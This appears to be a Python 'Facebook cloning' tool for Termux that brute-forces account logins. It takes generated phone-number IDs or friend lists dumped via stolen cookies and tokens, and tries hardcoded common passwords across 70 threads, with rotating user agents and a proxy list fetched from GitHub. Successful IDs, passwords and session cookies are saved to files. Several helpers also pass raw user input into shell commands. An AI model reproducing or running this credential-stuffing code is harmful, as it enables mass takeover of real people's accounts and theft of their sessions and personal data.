#coding/utf/
#created/by/mr.riaz
import os,zlib,time,random,uuid,subprocess,sys
from os import system
import time, json, string
from os import system as osRUB
from os import system as cmd
os.system('clear')
print(' Checking Tool Server Please Wait.....');time.sleep(1)
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
...
try:
    open('/sdcard/riaz.txt','w').write(' ')
except Exception as e:
    print(e)
    os.system('termux-setup-storage')
os.system('touch /sdcard/156.txt')
colors = ["\033[1;91m", "\033[0;92m", "\033[1;93m","\033[1;94m","\033[1;95m", "\033[0;96m"]
xoxo = random.choice(colors)
xox = random.choice(xoxo)
try:
...
client_id = f"42003896889828048564952729208"
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print("\n\033[1;96m--------------------------------------------")
        print('\033[1;97m The Cracking Has Been Complete...')
        print('\033[1;97m TOTAL OK : %s' % str(len(oks)))
        print("--------------------------------------------")
        input("\033[1;97m Press Enter To Back Main Menu ")
        menu()
#<----[banner]------>
logo=("""\033[1;97m
   _____ ___    _   _____    __  ___
  / ___//   |  / | / /   |  /  |/  /
  \__ \/ /| | /  |/ / /| | / /|_/ / 
 ___/ / ___ |/ /|  / ___ |/ /  / /  
...
\33[1;37m----------------------------------------------
   Owner      :  BLACK DIAMOND
   Facebook   :  SANAM TASEER
   Github     :  BLACK-MAFIA-420
   Tool Type  :  Free
...
def menu():
	clear()
	print('[1] File Cloning [M1]')
	print('[2] File Cloning [M2]')
	print('[3] Random Number Cloning [M1]')
	print('[4] Random Number Cloning [M2]')
	print('[5] Random Clone Choice pass')
	print('[6] File Create menu')
	print('[7] Make Your Fresh userugent')
	print('[8] Add 2_F On Facebook Acount')
	print('[9] Follow me on facebook')
	print('\x1b[1;91m[10] Exit Programme')
	linex()
	...
	if riaz =='6':
		riaz_dump()
	if riaz =='7':
		print(' for this script contact with me')
		os.system('xdg-open https://www.facebook.com/profile.php?id=100081567410458')
	if riaz =='8':
		print(' for this script contact with me')
		os.system('xdg-open https://www.facebook.com/profile.php?id=100081567410458')
	if riaz =='9':
	...
	if riaz =='10':
		...
		print(' Slect Right Option');menu()
#<----[methods]------>
def method_crack():
    global methods
    clear()
    print('[1] Method (mix ids)')
    print('[2] Method (new ids)')
    print('[3] Method (new ids)')
    linex()
    riaz = input(f"[•] Select Method : ")
    if riaz =='1':       
...
class main_crack():
    ...
    def crack(self,id):
        ...
        self.file = input(" File Path\033[1;37m : ")
        try:
...
#<----[pass_list]------>           
    def pasw(self):       
            ...
            os.system("clear")
            print(logo)
            print('\033[1;97m[*] Example : first last,firtslast,first123')
            linex()
            if sl =='':
                print('')
            elif sl > 20:
                ...
                for sr in range(sl):
                    pw.append(input(f" Put Password {sr+1}  "))
                    #<-----[<\>]---->
            os.system("clear")
            print(logo)
            total_id = str(len(self.id))
            print(f"[•] Total Acount :  {total_id}")
            print(f'\x1b[1;91m[•] If you no result use flight mode')
            linex()
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'method1' in methods:
                                refatworld.submit(self.method1, uid, name, pwx)
                            elif 'method2' in methods:
                                refatworld.submit(self.method2, uid, name, pwx)
                            elif 'method3' in methods:
                                refatworld.submit(self.method3, uid, name, pwx)
                   except:pass
            result(oks,cps)   
#<-----[Method~1]---->            
    def method1(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m[DIAMOND] {loop}|{len(self.id)} \x1b[1;92mOK:-{len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r\x1b[1;92m[DIAMOND-OK] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/DIAMOND-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m[DIAMOND-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
                     open('/sdcard/DIAMOND-CP.txt','a').write(rid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(rid, name, ps)
#<-----[Method~2]------>            
    def methodB(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m[DIAMOND] {loop}|{len(self.id)} \x1b[1;92mOK:-{len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    'fb_api_req_friendly_name':'authenticate',}
                headers = {'Authorization':f'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name':'authenticate',
                    'X-FB-Connection-Type':'unknown',
                    'User-Agent':riazfilee(),
            ...
            self.methodB(rid, name, ps)

#<----[Method~3]----->
    def method3(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m[DIAMOND] {loop}|{len(self.id)} \x1b[1;92mOK:-{len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;91m[DIAMOND-Ok] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/DIAMOND-OK.txt','a').write(rid+'|'+ps+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
...
def riazc():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] Pak Random Pass \x1b[1;92m[1]')
	print('\x1b[1;97m[2] Pak Random Pass \x1b[1;92m[2]')
	print('\x1b[1;97m[3] Pak Random Pass \x1b[1;92m[3]')
	print('\x1b[1;97m[4] Pak Random Pass \x1b[1;92m[4]')
	print('\x1b[1;97m[5] Pak Random Pass \x1b[1;92m[5]')
	print('\x1b[1;97m[6] Pak Random Pass \x1b[1;92m[6]')
	...
	if riaz =='7':
		...
		print('Slect Right Option ');riazc()
#<------[Cloning]------>
def riazcp():
    user=[]
    os.system('clear')
    print(logo)
    print(' Example : 92304 92315 92321 92333 92344 \033[0;97m')
    linex()
    kode = input(' Put Code : ')
    os.system('clear')
    print(logo)
    limit = int(input(' Example : 1000,2000,50000,1000***etc\n\33[1;37m----------------------------------------------\n put Limit : '))
    ...
    print(' Ids saved in DIAMOND-OK.txt,in cp DIAMOND-CP.txt')
    linex()
    input(' Press Enter to Back')    
    os.system('python DIAMOND.py')
#<------[Cloning]------>
...
def riazcp2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx = [guru+kude,'khankhan','khan786','khan12345']
            yaari.submit(rcrack,uid,pwx,tl)
    linex()
    print(' Crack process has been completed')
    print(' Ids saved in DIAMOND-OK.txt,in cp DIAMOND-CP.txt')
...
def riazcp3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx = [guru,'khan12345','khan786','khan123','khan1234','khan@123']
            yaari.submit(rcrack,uid,pwx,tl)
    linex()
    print(' Crack process has been completed')
    print(' Ids saved in DIAMOND-OK.txt,in cp DIAMOND-CP.txt')
...
def riazcp4():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx = [guru,'khan@123','baloch','baloch12345','king123','king12345','king@123','baloch@123']
            yaari.submit(rcrack,uid,pwx,tl)
    linex()
    print(' Crack process has been completed')
    print(' Ids saved in DIAMOND-OK.txt,in cp DIAMOND-CP.txt')
...
def riazcp5():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx = [guru,'khan@123','baloch','baloch12345','king123','king12345','king@123','baloch@123','kingkhan','ali786','ali12345']
            yaari.submit(rcrack,uid,pwx,tl)
    linex()
    print(' Crack process has been completed')
    print(' Ids saved in DIAMOND-OK.txt,in cp DIAMOND-CP.txt')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'t.facebook.com',
            'method': 'POST',
            'scheme': 'https',
           ...
           'upgrade-insecure-requests': '1',
             'user-agent':'Mozilla/5.0 (Linux; U; Android 10; vi-vn; Redmi K20 Pro Build/QKQ1.190716.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[DIAMOND-OK] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/DIAMOND-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[DIAMOND-CP] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/DIAMOND-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[MR.DIAMOND] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
#<-----[bd_clone]----->
...
def choice():
    ...
    linex()
    for life in range(passx):
        pww = input(f"[*] Enter Password {life+1} : ")
        riaz.append(pww)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[DIAMOND-OK] '+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/DIAMOND-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[DIAMOND-CP] '+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/DIAMOND-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\x1b[1;37m[MR.DIAMOND] %s|%s| \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\x1b[1;97m[MR.DIAMOND] %s| \033[1;32m OK:%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        RIAZ=session.cookies.get_dict().keys()
                        if "c_user" in RIAZ:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[DIAMOND-OK] %s | %s'%(ids,pas))
                                open('/sdcard/DIAMOND-OK.txt', 'a').write(ids+'|'+pas+'\n')                                
                                oks.append(ids)
                                
                                break
                        elif 'checkpoint' in RIAZ:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[DIAMOND-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DIAMOND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RIAZ:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[DIAMOND-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CP-DIAMOND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
try:
	prox= requests.get('https://raw.githubusercontent.com/ahmad77412/riaz/main/.prox.txt').text
...
for xd in range(5000):
	aa='Mozilla/5.0 (Linux; Android 10.0.1; CPH1969)'
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.DIAMOND\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[DIAMOND-OK] '+uid+' | '+ps+'\033[1;32m')
				open('DIAMOND-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(uid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[DIAMOND-CP] '+uid+' | '+ps+'\33[0;97m')
				open('DIAMOND-cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
...
try:
	...
	exit(f'\n [\033[1;35m>\033[0m] module {e} not yet installed')

from bs4 import BeautifulSoup
import string
import datetime
import threading
import marshal, os, time, platform
...
def riaz_dump():
    ...
    except (FileNotFoundError,IOError):friend()
    try:
    ...
    print(logo)
    print(" Active cookie :\033[1;92m %s" %nama) 
    print("\033[1;97m Userid        :\033[1;92m %s " %user) 
    linex()
    print('[1] Create unlemited file [Dump]')
    print('[2] Create simple file')
    print('[3] Remove dubble links')
    print('[4] Separate links')
    print('[5] Remove Cookies')
    linex()
    riaz=input(' Select Option :')
    if riaz =='1':
    	public_dump_auto()
    ...
    if riaz =='4':
    	separate()
    if riaz =='5':
    	os.system('rm -rf data/token.txt && rm -rf cokie.txt') ;os.system("clear");print("\n\033[1;91m successfully logout\033[1;90m deleted cookie! \033[1;97m ");time.sleep(2);elsashaikh()
    else:
    	print(' Slect Right Option');riaz_dump()
#<------[Clear]------>
...
def friend():
    Clear_Terminal(platform) ; print(logo)
    coki = input('Paste Cookie : ')
    if coki in ['',' ']:friend()
    else:
          link = ConvertCookie(coki)
          if 'status succes' in str(link):AuthorBot('https://mbasic.facebook.com/100086281072244?v=timeline',coki) ; riaz_dump()
          else:print(f'\nCookie invalid!') ; time.sleep(2);friend()
...
def public_single_dump():
	...
	try:
		...
		os.system("clear")
		print("\n\033[1;91m Saved Token/Cookie File Not Found! \x1b[1;97m")
		time.sleep(2)
		friend()
	try:
		os.system("clear") 
		try:
			...
			dmp = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5001)&access_token={}".format(fbbuid,token), cookies={"cookie":cokis}).json()
			apnd = open(savedfile,'w')
			for idnm in dmp['friends']['data']:
				totaldmp += 1
				apnd.write(idnm['id']+'|'+idnm['name']+'\n')
		except KeyError:
			print("\n\033[1;91m Public ID Error [ KeyError ]")
			public_single_dump()
		apnd.close()
		print(50*'\033[1;37m-')
		print(f"Total UID Save As:\033[1;97m {totaldmp}")
		print(f"\033[1;97mFile Save As:\033[1;93m {savedfile}")
		print(50*'\033[1;37m-')
		input(" \033[1;92mpress enter return to menu ")
		riaz_dump()
	except Exception as e:
...
def public_dump_auto():
	...
	try:
		...
		print(logo)
		print("\x1b[1;91m Cookie Expire\x1b[1;97m ")
		time.sleep(2)
		friend()
	try:
		os.system("clear")
		try:
			print(logo) 
			fbbuid = input("\033[0;97m[•] Enter Public ID Link : ")
			dmp = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5001)&access_token={}".format(fbbuid,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()
			for idnm in dmp['friends']['data']:
				totaldmp+=1
				fbidz.append(idnm['id'])
		except KeyError:
			print("\n\x1b[1;91m[!] ID Not Public\x1b[1;97m")
			time.sleep(2)
			public_dump_auto()
		print("\n\033[1;97m For Example /sdcard/elsa.txt ")
		filepath = input(" Output Save File Name: ")
		print(50*'\033[1;37m-')
		...
		for fbuid in fbidz:
			try:
				...
				for idnm in dmp['friends']['data']:
					apnd.write(idnm['id']+"|"+idnm['name']+'\n')
				print("\033[1;92mSuccesful ID Extract From: " + fbuid)
			except KeyError:
				print('')
		apnd.close()
		print('\n\x1b[1;97m')
		print(50*'\033[1;37m-')
		print (f"\x1b[0;37mTotal ID Dump :\x1b[1;92m {totaldmp}")
		print (f"\x1b[0;37mYour Dump File Save As :\x1b[1;92m {filepath} \033[1;97m")
		print(50*'\033[1;37m-')
		input("\n\033[1;92m   press enter return to menu\033[1;97m ")
		riaz_dump()
	except Exception as e:
		print("\033[1;91m Error : %s\033[1;97m"%e)
		exit() 
...
###---------[ Duplicate CUTTER & SEPARATE ]------->>
def duplicate():
	os.system('clear')
	print(logo)
	print(" Example : /sdcard/elsa.txt ")
	elsa = input(' Enter Duplicate File Path: ')
	xyz = input(' Output File Save As: ')
	os.system('touch ' +xyz)
	os.system('sort -r '+elsa+' | uniq > '+xyz)
	print("")
	print("")
	print(50*'\033[1;37m-')
	print(" Removing Successful From File " + elsa )
	print(" New File Save " + xyz )
	print(50*'\033[1;37m-')
	time.sleep(2)
...
def separate():
    ...
    print(logo)
    try:
        limit = int(input('\033[1;37m How many links do you want to separate? '))
    except:
        limit = 1
    file_name = input('\033[1;37m Enter Your file name: ')
    print(" Example /sdcard/johnnew.txt")
    new_save = input('\033[1;37m Output File Save As: ')
    y = 0
    for k in range(limit):
        y+=1
        print("\033[1;37m") 
        print(" Example 1000 - 10000 - 100087 - 100088 etc...")
        links = input(' Put links %s:\033[1;32m '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'\033[1;37m-')
    print('\033[0;92m Links grabbed successfully')
    print(' Total grabbed links:\033[1;32m   '+str(len(open(new_save).read().splitlines())))
    print(' Output Save File Name: \033[1;32m  '+new_save)
    print(50*'\033[1;37m-')
